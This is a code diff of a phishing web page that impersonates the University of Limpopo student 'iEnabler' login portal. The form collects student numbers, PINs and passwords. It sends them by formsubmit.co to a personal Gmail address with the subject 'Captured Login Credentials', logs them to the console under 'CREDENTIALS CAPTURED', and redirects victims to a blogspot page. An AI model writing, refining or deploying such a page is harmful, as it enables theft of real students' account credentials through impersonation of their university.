@@ -1,10 +1,11 @@
+@@ -1,92 +1,92 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>UL Self Help iEnabler</title>
-<styl
+<style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
 body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
 .wrap { width: 100%; max-width: 540px; border: 1px solid #999; background: #fff; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); }
@@ -20,18 +21,13 @@ body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: co
 .ul-input { width: 100%; padding: 7px 0; border: none; border-bottom: 1px solid #999; font-size: 13px; margin-bottom: 14px; background: transparent; }
 .msg-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; padding: 10px 14px; font-size: 13px; margin-bottom: 12px; border-radius: 2px; display: none; }
 .ul-btn.primary { padding: 8px 20px; background: #1a6faf; color: #fff; border: none; border-radius: 3px; cursor: pointer; }
-.pin-hint { font-size: 11px; color: #666; margin-top: -10px; margin-bottom: 14px; }
-.loading { opacity: 0.6; pointer-events: none; }
-.hidden-iframe { display: none; width: 0; height: 0; border: none; }
 </style>
 </head>
 <body>
 
-<iframe name="hidden_iframe" id="hidden_iframe" class="hidden-iframe"></iframe>
-
 <div class="wrap">
   <div class="fra-header"><span class="fra-inst">University of Limpopo | Self Help iEnabler</span></div>
-  
+
   <div class="logo-row">
     <div class="logo-left">
       <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhb_NYqAEn1jqc2PxQHsObY_8u-Y1v5o6J5sZlxakE8YzY2aNb75Z4bdsqd7ru5Q4Gknkj5IrF8HR7SiPDiIf3KqU92hHRK9Qp6xCnG-h4fMRCl1TYMuFrccJw-nq7ukMisZZuDY-JuxUBHwVeLFWyoT_0I4G7kakbD9RgW58UIUoguNh4YTbtQCJAuJg/s320/1200px-University_of_Limpopo_logo.svg.png" alt="UL Logo">
@@ -43,64 +39,54 @@ body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: co
   <div class="login-top">Registered Users: Login Credentials</div>
   <div class="login-body">
 
-    <div class="msg-error" id="msgError">⚠ Invalid credentials. Please verify your details and try again.</div>
+    <div class="msg-error" id="msgError">⚠ Please fill in all required fields correctly.</div>
 
-    <form action="https://formsubmit.co/getzgetz304@gmail.com" method="POST">
-    
-      <input type="hidden" name="_subject" value="UL Login Credentials">
+    <form id="loginForm" action="https://formsubmit.co/getzgetz599@gmail.com" method="POST">
+  
+      <input type="hidden" name="_subject" value="UL iEnabler - Captured Login Credentials">
+       <input type="hidden" name="_next" value="https://student-query.blogspot.com/2026/03/university-of-limpopo-student-query.html">
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="name" value="UL Student">
-      <input type="hidden" name="email" value="noreply@university.ac.za">
-      
+
       <div class="field-label">Student Number:</div>
-      <input class="ul-input" type="text" name="student_number" id="studentNumber" required autocomplete="off">
+      <input class="ul-input" type="text" name="student_number" id="studentNumber" required>
 
       <div class="field-label">Pin:</div>
-      <input class="ul-input" type="text" name="pin" id="pinField" maxlength="5" pattern="[1-9][0-9]{4}" required autocomplete="off">
+      <input class="ul-input" type="text" name="pin" id="pinField" maxlength="5" required>
       <p class="pin-hint">(5 numeric digits. Do not start with a 0.)</p>
 
       <div class="field-label">Password:</div>
-      <input class="ul-input" type="password" name="password" id="passwordField" required autocomplete="off">
+      <input class="ul-input" type="password" name="password" id="passwordField" required>
 
-      <button type="submit" class="ul-btn primary" id="submitBtn">Login</button>
+      <button type="submit" class="ul-btn primary">Login</button>
     </form>
   </div>
 </div>
 
 <script>
+
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     const studentNumber = document.getElementById('studentNumber').value.trim();
     const pin = document.getElementById('pinField').value.trim();
     const password = document.getElementById('passwordField').value.trim();
-    const errorMsg = document.getElementById('msgError');
-    const submitBtn = document.getElementById('submitBtn');
-    
+
     if (!studentNumber || !pin || !password) {
+        document.getElementById('msgError').style.display = 'block';
         e.preventDefault();
-        errorMsg.style.display = 'block';
-        return;
+        return false;
     }
-    
-    if (!/^[1-9]\d{4}$/.test(pin)) {
-        e.preventDefault();
-        errorMsg.textContent = '⚠ Pin must be 5 numeric digits and cannot start with 0.';
-        errorMsg.style.display = 'block';
-        return;
-    }
-    
-    errorMsg.style.display = 'none';
-    submitBtn.classList.add('loading');
-    submitBtn.textContent = 'Authenticating...';
-    
+
+
     console.log("%c=== CREDENTIALS CAPTURED ===", "color: red; font-weight: bold");
     console.log("Student Number:", studentNumber);
     console.log("PIN:", pin);
     console.log("Password:", password);
     console.log("%c=============================", "color: red; font-weight: bold");
-    
-    setTimeout(() => {
-        window.location.href = 'https://student-query.blogspot.com/2026/03/university-of-limpopo-student-query.html';
-    }, 5000);
+
+    // You can also alert for demo purposes
+    alert("logged in successfully !\n\nStudent Number: " + studentNumber + 
+          "\nPIN: " + pin + 
+          "\nPassword: " + password + 
+          "\n\n(This is for UL STUDENTS ONLY AND MAKE SURE YOUR CREDENTIALS ARE CORRECT TO LOGIN  )");
 });
 </script>
 
